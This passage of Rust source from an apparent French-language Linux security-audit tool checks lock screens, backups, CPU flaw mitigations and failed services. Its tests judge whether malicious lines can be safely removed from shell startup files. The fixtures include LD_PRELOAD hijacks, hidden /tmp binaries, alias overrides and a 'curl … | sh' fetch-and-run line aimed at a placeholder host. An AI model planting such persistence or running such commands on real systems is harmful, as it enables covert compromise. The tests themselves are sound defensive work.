            ["kreadconfig6", "kreadconfig5"]
                .iter()
                .find_map(|k| sortie(k, &["--file", "kscreenlockerrc", "--group", "Daemon", "--key", cle]))
                .map(|v| v.trim().to_string())
        };
        if lire("Autolock").as_deref() == Some("false") {
            Some(0)
        } else {
            Some((lire("Timeout").and_then(|m| m.parse::<u64>().ok()).unwrap_or(5)).saturating_mul(60))
        }
    } else if bureau.contains("hyprland") {
        // Hyprland sans Omarchy : hypridle doit avoir un délai qui verrouille.
        std::fs::read_to_string(maison.join(".config/hypr/hypridle.conf"))
            .ok()
            .map(|t| u64::from(t.contains("lock") && natif::processus_nomme("hypridle")))
    } else {
        None
    };
    Some(match delai {
        None => impossible(
            "Verrouillage",
            tr!(
                "environnement de bureau non reconnu",
                "desktop environment not recognized"
            ),
        ),
        Some(s) => super::verrouillage_selon_delai(
            s,
            tr!(
                "Activer le verrouillage automatique (5 minutes, c'est bien) dans les réglages d'écran du bureau",
                "Turn on automatic locking (5 minutes is good) in the desktop's display settings"
            ),
        ),
    })
}

/// Les minuteries lues, et les gestionnaires non lus (vrai : celui de l'utilisateur).
type Minuteries = (Vec<(String, u64, String, bool)>, Vec<bool>);

/// Minuteries systemd (système et utilisateur) : (nom, dernier passage en µs depuis 1970, service lancé, utilisateur ?),
/// lues par D-Bus (ListUnits, puis LastTriggerUSec et Unit de chaque minuterie), sans `systemctl list-timers` en
/// secours : il passe par les mêmes bus, et le PATH du compte en choisirait un faux. Rend aussi les gestionnaires qui
/// n'ont pu être lus (« système », « utilisateur ») : « aucune sauvegarde » n'y serait pas prouvé.
fn minuteries() -> Minuteries {
    let mut toutes = Vec::new();
    let mut non_lus = Vec::new();
    for utilisateur in [false, true] {
        match unites::bus(utilisateur).and_then(|mut b| unites::minuteries(&mut b)) {
            Ok(liste) => toutes.extend(liste.into_iter().map(|m| (m.nom, m.dernier, m.service, utilisateur))),
            Err(_) => non_lus.push(utilisateur),
        }
    }
    (toutes, non_lus)
}

/// Le résultat du dernier passage d'un service (« success »…), par D-Bus seul ; `None` sans bus (non lu).
fn resultat_du_service(service: &str, utilisateur: bool) -> Option<String> {
    unites::resultat(&mut unites::bus(utilisateur).ok()?, service)
}

/// Une minuterie de sauvegarde ? `Some(true)` = vraie sauvegarde, `Some(false)` = instantanés sur le même disque.
fn type_sauvegarde(nom: &str) -> Option<bool> {
    let n = nom.to_ascii_lowercase();
    if [
        "restic",
        "borg",
        "backup",
        "sauvegarde",
        "kopia",
        "duplicity",
        "rsnapshot",
        "timeshift",
        "deja-dup",
        "btrbk",
    ]
    .iter()
    .any(|m| n.contains(m))
    {
        Some(true)
    } else if n.contains("snapper") && n.contains("timeline") {
        Some(false)
    } else {
        None
    }
}

/// La meilleure défense contre une panne de disque, un vol ou un rançongiciel.
fn sauvegardes() -> Constat {
    if !systemd() {
        return impossible("Sauvegardes", tr!("systemd absent", "systemd missing"));
    }
    let maintenant = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| u64::try_from(d.as_micros()).unwrap_or(u64::MAX));
    let (toutes, non_lus) = minuteries();
    let vraies: Vec<_> = toutes.iter().filter(|t| type_sauvegarde(&t.0) == Some(true)).collect();
    let instantanes = toutes.iter().any(|t| type_sauvegarde(&t.0) == Some(false));
    let Some(meilleure) = vraies.iter().filter(|t| t.1 > 0).max_by_key(|t| t.1) else {
        return if let Some(t) = vraies.first() {
            alerte(
                "Sauvegardes",
                Niveau::Moyen,
                trf!(
                    "La sauvegarde « {} » n'a encore jamais tourné.",
                    "The “{}” backup has never run yet.",
                    t.0
                ),
            )
        } else if instantanes {
            alerte(
                "Sauvegardes",
                Niveau::Info,
                tr!("Seulement des instantanés snapper, sur le même disque : ils ne protègent ni d'une panne de disque ni d'un vol.", "Only snapper snapshots, on the same disk: they protect neither against a disk failure nor against theft."),
            )
            .manuel(tr!("Ajouter une vraie sauvegarde vers un autre disque : menu Données et sauvegardes › Sauvegarde automatique, ou restic, Borg, Timeshift…", "Add a real backup to another disk: menu Data › Automatic backup, or restic, Borg, Timeshift…"), &[])
        } else if !non_lus.is_empty() {
            // Un gestionnaire qui ne répond pas (bus de la session absent, sous sudo) peut porter la sauvegarde :
            // « aucune » n'est pas prouvé.
            impossible(
                "Sauvegardes",
                if non_lus.contains(&true) {
                    tr!("minuteries de l'utilisateur illisibles", "user timers unreadable")
                } else {
                    tr!("minuteries du système illisibles", "system timers unreadable")
                },
            )
        } else {
            alerte("Sauvegardes", Niveau::Moyen, tr!("Aucune sauvegarde automatique détectée.", "No automatic backup detected.")).manuel(
                tr!("Mettre en place une sauvegarde vers un autre disque : menu Données et sauvegardes › Sauvegarde automatique, ou restic, Borg, Timeshift…", "Set up a backup to another disk: menu Data › Automatic backup, or restic, Borg, Timeshift…"),
                &[],
            )
        };
    };
    let (nom, dernier, service, utilisateur) = meilleure;
    let resultat = resultat_du_service(service, *utilisateur);
    let age = maintenant.saturating_sub(*dernier) / 86_400_000_000;
    let quand = if age == 0 {
        tr!("aujourd'hui", "today").to_string()
    } else {
        trf!("il y a {age} jour(s)", "{age} day(s) ago")
    };
    if resultat.as_deref().is_some_and(|r| r != "success") {
        alerte(
            "Sauvegardes",
            Niveau::Moyen,
            trf!(
                "La dernière sauvegarde « {nom} » ({quand}) a échoué ({}).",
                "The last “{nom}” backup ({quand}) failed ({}).",
                resultat.unwrap_or_default()
            ),
        )
        .manuel(
            tr!("Voir l'erreur", "See the error"),
            &[&format!(
                "journalctl {}-u {service} -n 30",
                if *utilisateur { "--user " } else { "" }
            )],
        )
    } else if age > 7 {
        alerte(
            "Sauvegardes",
            Niveau::Moyen,
            trf!(
                "Dernière sauvegarde « {nom} » {quand} : trop ancienne.",
                "Last “{nom}” backup {quand}: too old."
            ),
        )
    } else {
        ok(
            "Sauvegardes",
            trf!(
                "Sauvegarde automatique « {nom} », dernière {quand}.",
                "Automatic “{nom}” backup, last one {quand}."
            ),
        )
    }
}

/// Failles du processeur (Spectre, Meltdown…) encore ouvertes, d'après ce que le noyau en dit.
fn failles_vulnerables(etats: &[(String, String)]) -> Vec<String> {
    etats
        .iter()
        .filter(|(_, e)| e.trim_start().starts_with("Vulnerable"))
        .map(|(n, _)| n.clone())
        .collect()
}

fn processeur() -> Constat {
    let Ok(dossier) = std::fs::read_dir("/sys/devices/system/cpu/vulnerabilities") else {
        return impossible(
            "Processeur",
            tr!(
                "état des failles du processeur illisible",
                "processor flaw state unreadable"
            ),
        );
    };
    let etats: Vec<(String, String)> = dossier
        .flatten()
        .filter_map(|f| {
            Some((
                f.file_name().to_string_lossy().into_owned(),
                std::fs::read_to_string(f.path()).ok()?,
            ))
        })
        .collect();
    let failles = failles_vulnerables(&etats);
    if failles.is_empty() {
        return ok(
            "Processeur",
            trf!(
                "Protégé contre les {} failles connues du processeur (Spectre, Meltdown…).",
                "Protected against the {} known processor flaws (Spectre, Meltdown…).",
                etats.len()
            ),
        );
    }
    let constat = alerte(
        "Processeur",
        Niveau::Moyen,
        trf!(
            "Processeur vulnérable à : {}. Un programme malveillant pourrait lire la mémoire d'autres programmes.",
            "Processor vulnerable to: {}. A malicious program could read the memory of other programs.",
            failles.join(", ")
        ),
    );
    let Some(g) = Paquets::detecter() else {
        return constat.manuel(
            tr!(
                "Installer le microcode du fabricant et mettre le noyau à jour, puis redémarrer",
                "Install the manufacturer's microcode and update the kernel, then restart"
            ),
            &[],
        );
    };
    // Le microcode du fabricant corrige la plupart de ces failles ; le paquet change selon la distribution.
    let amd = crate::socle::lire_texte("/proc/cpuinfo").is_ok_and(|c| c.contains("AuthenticAMD"));
    let paquet = match (g, amd) {
        (Paquets::Pacman, true) => "amd-ucode",
        (Paquets::Pacman, false) => "intel-ucode",
        (Paquets::Apt, true) => "amd64-microcode",
        (Paquets::Apt, false) => "intel-microcode",
        (Paquets::Dnf, _) => "microcode_ctl linux-firmware",
        (Paquets::Zypper, true) => "ucode-amd",
        (Paquets::Zypper, false) => "ucode-intel",
    };
    constat.corriger(
        tr!(
            "Installer le microcode du fabricant (effectif après mise à jour du système et redémarrage)",
            "Install the manufacturer's microcode (effective after a system update and a restart)"
        ),
        &[&g.installer(paquet)],
    )
}

fn services_en_echec() -> Constat {
    if !systemd() {
        return impossible("Services", tr!("systemd absent", "systemd missing"));
    }
    // Demandé à systemd par le bus système, ce que dit `systemctl --failed`.
    let liste = dbus::Bus::systeme().and_then(|mut bus| dbus::unites_en_echec(&mut bus));
    let n = match liste {
        Ok(liste) => liste.len(),
        Err(e) => {
            return impossible(
                "Services",
                &trf!("systemd n'a pas répondu ({e})", "systemd did not answer ({e})"),
            );
        }
    };
    if n == 0 {
        ok(
            "Services",
            tr!("Aucun service système en échec.", "No failed system service."),
        )
    } else {
        alerte(
            "Services",
            Niveau::Info,
            trf!("{n} service(s) en échec.", "{n} failed service(s)."),
        )
        .manuel(
            tr!("Voir lesquels et leurs erreurs", "See which ones and their errors"),
            &["systemctl --failed"],
        )
    }
}

pub fn auditer() -> Audit {
    // Les vérifications sont les règles du registre (regles.rs, plateforme.rs), le pare-feu en tête.
    super::audit(NOM)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Rondes 4 et 5 du lot 096 (R4-3, N2) : retirer seule une ligne d'un fichier lu par un shell ne doit jamais faire
    /// lancer une autre ligne ni casser la lecture du reste. Chaque cas refusé a été rejoué avec bash (« . fichier »
    /// avant et après le retrait) : le corps d'un heredoc, d'une fonction ou d'un bras de case, le texte d'un
    /// guillemet, la suite d'un « && » ou d'un « return » est lancé, ou une erreur de syntaxe arrête la lecture
    /// (« umask » d'après perdu). Témoins : une ligne ordinaire, une ligne d'un bloc qui garde un corps, une
    /// apostrophe en commentaire ou entre guillemets, une substitution fermée sur sa ligne ; et un fichier lu ligne
    /// par ligne (.desktop) qu'une apostrophe ne bloque pas.
    #[test]
    fn retrait_qui_change_le_shell_refuse() {
        let p = "export LD_PRELOAD=/tmp/.x/a.so";
        let sh = "/etc/profile.d/x.sh";
        for (contenu, n) in [
            (format!("{p}; cat >/dev/null <<EOF\necho REVEILLEE\nEOF\necho fin\n"), 0),
            (format!("cat >/dev/null <<EOF\n{p}\nEOF\n"), 1),
            (format!("export X=\"a {p}\necho REVEILLEE\n\"\necho fin\n"), 0),
            (format!("export X='a\n{p}\n'\n"), 1),
            (format!("false &&\n{p}\necho apres\n"), 1),
            (format!("false &&\n\n# note\n{p}\necho apres\n"), 3),
            (format!("{p}; false &&\necho REVEILLEE\n"), 0),
            (format!("{p} |\ncat\n"), 0),
            (format!("{p}; if false; then\necho REVEILLEE\nfi\n"), 0),
            (format!("if true; then\n{p}\nfi\numask 077\n"), 1),
            (format!("{p}; f() {{\necho REVEILLEE\n}}\n"), 0),
            (format!("{p}; ( false\n"), 0),
            // Ronde 5 (N2), les six cas de la relecture :
            // 1. « P; f() », corps à la ligne suivante.
            (format!("{p}; f()\n( echo REVEILLEE )\n"), 0),
            // 2. « P; return » (et exit) : la suite du fichier ne tournait pas.
            (format!("{p}; return\necho REVEILLEE\n"), 0),
            (format!("{p} || exit\necho REVEILLEE\n"), 0),
            // 3. Un guillemet dans « "$( ' … ' )" » : à la substitution, pas au guillemet du dehors.
            (format!("{p}; X=\"$(echo '\"\necho REVEILLEE\n: ')\" #'\n"), 0),
            (format!("X=\"$(echo '\"\n{p}\n: ')\" #'\n"), 1),
            // 4. Bras de case.
            (format!("case a in\n(a) {p} ;;\n(*) echo REVEILLEE ;;\nesac\n"), 1),
            (format!("case a in\na)\n{p}\n;;\nesac\n"), 2),
            // 5. « if » / P / « then » ; « f() » / « ( P ) » ; « [[ » sur deux lignes.
            (format!("if\n{p}\nthen echo a\nfi\numask 077\n"), 1),
            (format!("f()\n( {p} )\numask 077\n"), 1),
            (format!("f()\n{p}\numask 077\n"), 1),
            (format!("{p}; [[ a == b\n|| -n x ]]\numask 077\n"), 0),
            (format!("[[ a == b\n{p}\n]]\numask 077\n"), 1),
            // Autres mots de bloc, accolades et parenthèses, sur la ligne retirée.
            (format!("while false\ndo {p}\ndone\n"), 1),
            (format!("for x in a\ndo\n{p}\ndone\n"), 2),
            (format!("if false; then\necho a\nelse {p}\nfi\n"), 2),
            (format!("if false; then\necho a\nelif {p}\nthen echo b\nfi\n"), 2),
            (format!("{{ {p}\n}}\n"), 0),
            (format!("{{\n{p} }}\n"), 1),
            (format!("( {p}\n)\n"), 0),
            (format!("X=$'a\n{p}\n'\n"), 1),
            (format!("X=`echo\n{p}\n`\n"), 1),
            (format!("X=$(echo\n{p}\n)\n"), 1),
            (format!("X=${{Y:-\n{p}\n}}\n"), 1),
            (format!("(( 1 +\n{p}\n))\n"), 1),
            // « ' » ouvre un guillemet dans « $( » même entre doubles : la ligne d'après est du texte (bash : la
            // retirer change la valeur de X).
            (format!("X=\"$(echo ')\"\n{p}\n: ')\"\n"), 1),
            // Ligne d'avant finie par un mot de bloc, ligne d'après ordinaire : prudence (bash n'y change rien ici,
            // mais la règle ne dépend pas de ce que le corps garde).
            (format!("while false; do\n{p}\necho a\ndone\n"), 1),
            (format!("until {p}\ndo :; done\n"), 0),
            (format!("{p} &&\n: \n"), 0),
            (format!("eval {p}\n"), 0),
            ("alias ls=/tmp/.x/a\nls\n".to_string(), 0),
            (format!("function f\n{p}\n"), 1),
            // La ligne d'après continue la retirée, ou lit son code de retour.
            (format!("if true\n{p}\nthen :\nfi\n"), 1),
            ("/tmp/.x/a &\nkill $!\n".to_string(), 0),
            (format!("{p}\n[ $? -eq 0 ] || echo REVEILLEE\n"), 0),
            (format!("{p}\n|| echo REVEILLEE\n"), 0),
            // Un « case » dans une substitution : le reste du fichier est dans le doute.
            (format!("X=$(case a in a) echo;; esac)\n{p}\n"), 1),
            (format!("X=$(case a in a) echo;; esac); :\n{p}\necho fin\n"), 1),
            // Une « ) » non appariée finit la ligne d'avant (un motif de case) : prudence, la ligne d'après est
            // ordinaire.
            (format!("case a in\na)\n{p}\necho b ;;\nesac\n"), 2),
            // Ronde 6 : des lignes qui n'ont pas la forme la plus simple, même seules (avant, admises sous la règle de
            // la commande simple) : une substitution, une commande en fond ou dans un tube, un commentaire à
            // guillemet.
            ("export X=\"$(cat /tmp/.x/y)\"\n".to_string(), 0),
            ("nohup /tmp/.x/a >/dev/null 2>&1 &\necho fin\n".to_string(), 0),
            ("curl -s http://exemple.invalid/x | sh\necho fin\n".to_string(), 0),
            (format!("A='x # y'\n{p} # l'agent\n"), 1),
        ] {
            assert_eq!(
                retrait_decoupe(sh, contenu.as_bytes(), &[n]),
                Some(Decoupe::Shell),
                "{contenu:?} ligne {n}"
            );
        }
        // Ronde 7 : les témoins admis des rondes 4 à 6 portent une commande ; plus de lecteur de shell, ils restent à
        // la main. Une apostrophe en commentaire, elle, ne bloque rien.
        for (contenu, n) in [
            (format!("umask 077\n{p}\necho fin\n"), 1),
            (format!("if true; then\n  echo a\n  {p}\n  echo b\nfi\n"), 2),
            (format!("echo \"l'été\"\n{p}\necho fin\n"), 1),
            (format!("[ -x /tmp/.x/a ] && /tmp/.x/a\n{p}\necho fin\n"), 1),
            (format!("echo ${{HOME}}\n{p}\necho fin\n"), 1),
            (format!("X=\"$(echo ')' \"b\")\"\n{p}\necho fin\n"), 1),
        ] {
            assert_eq!(
                retrait_decoupe(sh, contenu.as_bytes(), &[n]),
                Some(Decoupe::Shell),
                "{contenu:?} ligne {n}"
            );
        }
        assert_eq!(
            retrait_decoupe(sh, format!("# Don't touch\n{p}\n").as_bytes(), &[1]),
            None
        );
        // Jugé comme du shell, un texte à apostrophe est refusé (prudence par défaut). Ronde 9 : un .desktop ou un
        // fichier de cron ne se corrige plus seul (`Decoupe::Format`) ; ronde 10 (N10-3), un fichier de gestionnaire
        // de connexion non plus (`Decoupe::Connexion`), avant même le « \ » final.
        let gdm = b"[daemon]\nX=L'agent\nAutomaticLoginEnable=true\n";
        assert_eq!(
            retrait_decoupe("/etc/gdm3/custom.conf", gdm, &[2]),
            Some(Decoupe::Connexion)
        );
        assert_eq!(retrait_decoupe(sh, gdm, &[2]), Some(Decoupe::Shell));
        assert_eq!(
            retrait_decoupe(
                "/etc/gdm3/custom.conf",
                b"[daemon]\nAutomaticLoginEnable=true \\\n",
                &[1]
            ),
            Some(Decoupe::Connexion)
        );
        // Sous la racine d'un essai, le chemin se juge par sa fin.
        assert_eq!(
            retrait_decoupe("/tmp/essai/etc/gdm3/custom.conf", gdm, &[2]),
            Some(Decoupe::Connexion)
        );
        let bureau = b"[Desktop Entry]\nName=L'agent\nExec=/tmp/.x/a\n";
        assert_eq!(
            retrait_decoupe("/tmp/essai/etc/xdg/autostart/a.desktop", bureau, &[2]),
            Some(Decoupe::Format)
        );
    }

    /// Ronde 5 du lot 096 (N4) : plusieurs lignes retirées ensemble, dans n'importe quel ordre. Ronde 7 : un NOM posé
    /// deux fois fait refuser tout retrait du fichier, même des deux lignes ensemble (règle du fichier entier) ; des
    /// NOMS différents dans un fichier d'affectations partent ensemble.
    #[test]
    fn lignes_pareilles_jugees_ensemble() {
        let p = "export LD_PRELOAD=/tmp/.x/a.so";
        let sh = "/etc/profile.d/x.sh";
        let vide = format!("if true; then\n{p}\n{p}\nfi\numask 077\n");
        assert_eq!(retrait_decoupe(sh, vide.as_bytes(), &[2, 1]), Some(Decoupe::Shell));
        let suite = format!("false &&\n{p}\n{p}\necho apres\n");
        assert_eq!(retrait_decoupe(sh, suite.as_bytes(), &[2, 1]), Some(Decoupe::Shell));
        let fin = format!("umask 077\n{p}\n{p}\n}}\n");
        assert_eq!(retrait_decoupe(sh, fin.as_bytes(), &[1, 2]), Some(Decoupe::Shell));
        let loin = format!("A=b\n{p}\n\n# note\n{p}\nC=d\n");
        assert_eq!(retrait_decoupe(sh, loin.as_bytes(), &[4, 1]), Some(Decoupe::Shell));
        assert_eq!(retrait_decoupe(sh, loin.as_bytes(), &[1]), Some(Decoupe::Shell));
        let deux = format!("A=b\n{p}\n\n# note\nexport LD_AUDIT=/tmp/.x/b.so\nC=d\n");
        assert_eq!(retrait_decoupe(sh, deux.as_bytes(), &[4, 1]), None);
        // Un numéro hors du fichier ne fait rien tomber, et n'admet rien de plus ; une ligne qui n'est pas une
        // affectation (vide, commentaire) ne se retire pas comme telle.
        assert_eq!(retrait_decoupe(sh, deux.as_bytes(), &[1, 4, 99]), None);
        assert_eq!(retrait_decoupe(sh, deux.as_bytes(), &[1, 3]), Some(Decoupe::Shell));
        assert_eq!(retrait_decoupe(sh, deux.as_bytes(), &[2]), Some(Decoupe::Shell));
        assert_eq!(retrait_decoupe(sh, suite.as_bytes(), &[99, 1]), Some(Decoupe::Shell));
    }

    /// Ronde 6 du lot 096 : seule une ligne « [export ]NOM=valeur » de la forme la plus simple, dans un voisinage qui
    /// ne la relie à rien, se retire seule. Chaque cas refusé de la relecture (R6-1 à R6-5) et chaque règle nouvelle
    /// a été rejoué avec bash 5.3 (« . fichier » avant et après le retrait de la ligne, script du rapport de la ronde 6) :
    /// la sortie change (« REVEILLEE » affiché, « umask 077 » perdu, code de sortie du fichier changé) ; les témoins
    /// admis, eux, gardent la même sortie.
    #[test]
    fn retrait_de_la_forme_la_plus_simple_seulement() {
        let p = "export LD_PRELOAD=/tmp/.x/a.so";
        let sh = "/etc/profile.d/x.sh";
        for (contenu, n) in [
            // R6-1 : un mot de sortie entre guillemets, ou coupé par « \ », ou venu d'une variable ; « && » en milieu
            // de ligne.
            ("\"return\" # LD_PRELOAD=/tmp/.x/a.so\necho REVEILLEE\n".to_string(), 0),
            (format!("{p} && \"return\"\necho REVEILLEE\n"), 0),
            (format!("{p} && \\return\necho REVEILLEE\n"), 0),
            (format!("{p} && \\exit\necho REVEILLEE\n"), 0),
            (format!("{p} && ex\\it\necho REVEILLEE\n"), 0),
            (format!("{p} && \"exec\" true\necho REVEILLEE\n"), 0),
            (format!("R=return\n{p} && $R\necho REVEILLEE\n"), 1),
            // R6-2 : « ${X:?} » arrête le shell ; « set -e » et une ligne qui échoue.
            (format!("{p}${{ZZ:?}}\necho REVEILLEE\n"), 0),
            (format!("{p}${{ZZ?}}\necho REVEILLEE\n"), 0),
            ("set -e\nLD_PRELOAD=/tmp/.x/a.so false\necho REVEILLEE\n".to_string(), 1),
            (format!("set -e\n{p} && false\necho REVEILLEE\n"), 1),
            // R6-3 : un heredoc ouvert dans « $( » (son mot de fin est la ligne retirée).
            (format!("X=$(cat <<'{p}'\n) #\n{p}\necho dans )\numask 077\n"), 2),
            // R6-5 : « $? » lu sur une ligne jointe par « \ » à la suivante.
            (format!("false\n{p}\n[ \\\n$? = 0 ] || echo REVEILLEE\n"), 1),
            // « $? » lu dans une substitution ouverte par la ligne d'après.
            (
                format!("false\n{p}\nX=\"$(\necho $?)\"\n[ \"$X\" = 0 ] || echo REVEILLEE\n"),
                1,
            ),
            // « |& » en fin de ligne : la ligne d'après en est la suite.
            (format!("echo abc |&\n{p}\nwc -c\n"), 1),
            // Le fichier change ce que fait la ligne : readonly (bash --posix), local -r et set -e, alias, fonction
            // « export », LINENO, trap DEBUG, « $'…' » qui écrit « alias ».
            (format!("readonly LD_PRELOAD=/usr/lib/x.so\n{p}\necho REVEILLEE\n"), 1),
            (
                format!("set -e\nf() {{\nlocal -r LD_PRELOAD=/usr/lib/x.so\n{p}\necho REVEILLEE\n}}\nf\n"),
                3,
            ),
            (format!("alias export=return\n{p}\necho REVEILLEE\n"), 1),
            (format!("\"ali\"as export=return\n{p}\necho REVEILLEE\n"), 1),
            (format!("export() {{ exit; }}\n{p}\necho REVEILLEE\n"), 1),
            (format!("function export {{ exit; }}\necho a\n{p}\necho REVEILLEE\n"), 2),
            (format!("{p}\n[ $LINENO = 2 ] || return\necho REVEILLEE\n"), 0),
            (
                format!(
                    "trap '[ \"$BASH_COMMAND\" = \"{p}\" ] && n=1' DEBUG\n{p}\n[ -n \"$n\" ] && return\necho REVEILLEE\n"
                ),
                1,
            ),
            (format!("$'\\x61lias' export=return\n{p}\necho REVEILLEE\n"), 1),
            // Le NOM posé est lu plus bas ; une variable du shell lui-même (IFS).
            (format!("{p}\n[ -n \"$LD_PRELOAD\" ] && return\necho REVEILLEE\n"), 0),
            (
                format!("{p}\nprintenv LD_\"PRELOAD\" >/dev/null && return\necho REVEILLEE\n"),
                0,
            ),
            (
                "IFS=x\nset -- $(echo axb); [ $# = 2 ] && return\necho REVEILLEE\n".to_string(),
                0,
            ),
            // Dernière ligne pleine après une commande gardée : le code de sortie du fichier lu changerait.
            (format!("[ -x /nexistepas ] && /nexistepas\n{p}\n"), 1),
            (format!("[ -x /nexistepas ] && /nexistepas\n{p}\n\n# fin\n"), 1),
            // Hors de la forme : « $ », accent grave, « ; », « & », « < », « > », glob, « ~ », « \r », guillemet
            // non fermé, ou valeur coupée par un blanc.
            ("export LD_PRELOAD=$HOME/a.so\necho fin\n".to_string(), 0),
            ("export LD_PRELOAD=`x`\necho fin\n".to_string(), 0),
            (format!("{p};\necho fin\n"), 0),
            (format!("{p} &\necho fin\n"), 0),
            (format!("{p} >/dev/null\necho fin\n"), 0),
            ("export LD_PRELOAD=/tmp/*.so\necho fin\n".to_string(), 0),
            ("export LD_PRELOAD=~/a.so\necho fin\n".to_string(), 0),
            (format!("{p}\r\necho fin\n"), 0),
            ("export LD_PRELOAD=\"/tmp/a.so\necho fin\n\"\n".to_string(), 0),
            ("export LD_PRELOAD=/a.so /b.so\necho fin\n".to_string(), 0),
            ("export LD_PRELOAD\necho fin\n".to_string(), 0),
            ("export -n LD_PRELOAD=/a.so\necho fin\n".to_string(), 0),
            (format!("{p} # \"x\"\necho fin\n"), 0),
        ] {
            assert_eq!(
                retrait_decoupe(sh, contenu.as_bytes(), &[n]),
                Some(Decoupe::Shell),
                "{contenu:?} ligne {n}"
            );
        }
        // Ronde 7 : les témoins admis de la ronde 6 portent une commande, une variable du shell ou une forme plus
        // large (guillemets doubles, commentaire en fin de ligne) : à la main désormais.
        for (contenu, n) in [
            (format!("umask 077\n{p}\necho fin\n"), 1),
            (format!("umask 077\nA=b\n{p}\n"), 2),
            (
                "PATH=/usr/local/bin:/usr/bin\nexport LD_PRELOAD='/tmp/a b.so'\necho fin\n".to_string(),
                1,
            ),
            ("\tLD_PRELOAD=\"/tmp/.x/a.so\" # signalée\necho fin\n".to_string(), 0),
            (
                "export LD_PRELOAD=/tmp/.x/a.so:/tmp/.x/b.so\n/usr/local/bin/aide --installer\n".to_string(),
                0,
            ),
            (format!("X={}\n{p}\necho fin\n", "\"$(".repeat(100)), 1),
        ] {
            assert_eq!(
                retrait_decoupe(sh, contenu.as_bytes(), &[n]),
                Some(Decoupe::Shell),
                "{contenu:?} ligne {n}"
            );
        }
        assert_eq!(retrait_decoupe(sh, format!("{p}\n").as_bytes(), &[0]), None);
        // Au-delà de `RETRAIT_OCTETS_MAX` octets : rien n'est jugé.
        let gros = format!("{p}\n#{}\n", "a".repeat(RETRAIT_OCTETS_MAX));
        assert_eq!(retrait_decoupe(sh, gros.as_bytes(), &[0]), Some(Decoupe::Trop));
    }

    /// Ronde 5 du lot 096 (N3, N4) : « lu ligne par ligne » se décide sur le nom du fichier et de ses dossiers exacts,
    /// jamais sur un bout du chemin : un script de shell rangé sous /etc/gdm/ ou /etc/lightdm/ reste du shell.
    #[test]
    fn lu_ligne_par_ligne_par_le_nom_exact() {
        for f in [
            "/etc/crontab",
            "/etc/anacrontab",
            "/etc/cron.d/x",
            "/tmp/essai/etc/cron.d/x",
            "/etc/sddm.conf",
            "/etc/sddm.conf.d/a.conf",
            "/usr/lib/sddm/sddm.conf.d/a.conf",
            "/etc/gdm/custom.conf",
            "/etc/gdm3/custom.conf",
            "/etc/gdm3/daemon.conf",
            "/etc/lightdm/lightdm.conf",
            "/etc/lightdm/lightdm.conf.d/a.conf",
            "/etc/systemd/system/a.service",
            "/etc/systemd/system/a.timer",
            "/etc/systemd/system/a.service.d/b.conf",
            "/etc/xdg/autostart/a.desktop",
        ] {
            assert!(lu_ligne_par_ligne(f), "{f}");
        }
        for f in [
            "/etc/gdm/PostSession/Default",
            "/etc/gdm3/Init/Default",
            "/etc/gdm/x.sh",
            "/etc/lightdm/session-setup.sh",
            "/etc/cron.d.sh",
            "/home/alice/cron.d/x",
            "/etc/systemd/system/x.sh",
            "/etc/sddm.conf.d/x.sh",
            "/etc/profile.d/crontab",
            "/etc/profile",
            "/home/alice/.bashrc",
        ] {
            assert!(!lu_ligne_par_ligne(f), "{f}");
        }
    }

    /// Ronde 5 du lot 096 (N1) : le jugement des retraits est linéaire. Avant, 800 lignes pareilles coûtaient 30 s
    /// (N⁴) et 8 000 lignes ne finissaient pas. Tenu par le compte des pas (une ligne découpée, un numéro jugé), pas
    /// par une durée : un retour en arrière vers une recherche par ligne compterait des millions de pas.
    #[test]
    fn retrait_de_lignes_pareilles_lineaire() {
        for n in [800usize, 8000] {
            let p = (0..n)
                .map(|i| format!("export LD_X{i}=/tmp/.x/a.so\n"))
                .collect::<Vec<_>>()
                .concat();
            for (texte, attendu) in [
                (p.clone(), None),
                (format!("if true; then\n{p}fi\n"), Some(Decoupe::Shell)),
                ("export LD_PRELOAD=/tmp/.x/a.so\n".repeat(n), Some(Decoupe::Shell)),
            ] {
                let numeros: Vec<usize> = (0..n).map(|i| i + usize::from(attendu.is_some())).collect();
                PAS_DE_RETRAIT.with(|c| c.set(0));
                let debut = std::time::Instant::now();
                assert_eq!(
                    retrait_decoupe("/etc/profile.d/x.sh", texte.as_bytes(), &numeros),
                    attendu
                );
                let pas = PAS_DE_RETRAIT.with(std::cell::Cell::get);
                assert!(pas <= 8 * (n as u64 + 3), "{n} lignes : {pas} pas");
                assert!(
                    debut.elapsed() < std::time::Duration::from_secs(10),
                    "{n} lignes : {:?}",
                    debut.elapsed()
                );
            }
        }
    }

    /// Ronde 5 du lot 096 (N1) : au-delà de `RETRAIT_LIGNES_MAX` lignes, rien n'est jugé et le retrait est refusé
    /// (jamais admis sans jugement) ; à la borne, il se juge.
    #[test]
    fn retrait_d_un_fichier_trop_long_refuse() {
        let p = "export LD_PRELOAD=/tmp/.x/a.so";
        let juste = format!("{p}{}", "\n".repeat(RETRAIT_LIGNES_MAX - 1));
        assert_eq!(retrait_decoupe("/etc/profile.d/x.sh", juste.as_bytes(), &[0]), None);
        let trop = format!("{p}{}", "\n".repeat(RETRAIT_LIGNES_MAX));
        assert_eq!(
            retrait_decoupe("/etc/profile.d/x.sh", trop.as_bytes(), &[0]),
            Some(Decoupe::Trop)
        );
        // Un fichier de gestionnaire de connexion est refusé avant d'être compté (ronde 10, N10-3).
        assert_eq!(
            retrait_decoupe("/etc/gdm3/custom.conf", trop.as_bytes(), &[0]),
            Some(Decoupe::Connexion)
        );
    }

    /// Le jugement du retrait de la ligne qui pose `nom`, seule puis précédée d'« export », dans un fichier fait
    /// d'affectations simples (ronde 7 du lot 096) ; le même fichier avec LD_PRELOAD est admis
    /// (`retrait_admis_dans_un_fichier_d_affectations`) : un refus ici vient du NOM.
    fn juge_le_nom(nom: &str) -> [Option<Decoupe>; 2] {
        let sh = "/etc/profile.d/x.sh";
        [
            retrait_decoupe(
                sh,
                format!("A=b\n{nom}=LD_PRELOAD=/tmp/.x/a.so\nC=d\n").as_bytes(),
                &[1],
            ),
            retrait_decoupe(sh, format!("A=b\nexport {nom}=/tmp/.x/a.so\nC=d\n").as_bytes(), &[1]),
        ]
    }

    /// Ronde 7 du lot 096 : Vanguard ne lit plus de shell. Un retrait seul n'est admis que dans un fichier fait
    /// uniquement de lignes vides, de commentaires entiers et d'affectations de la forme la plus simple, chaque NOM
    /// une fois. Chaque exemple de la relecture (R7-1 à R7-5) a été rejoué avec bash 5.3 et sh (« . fichier » avant
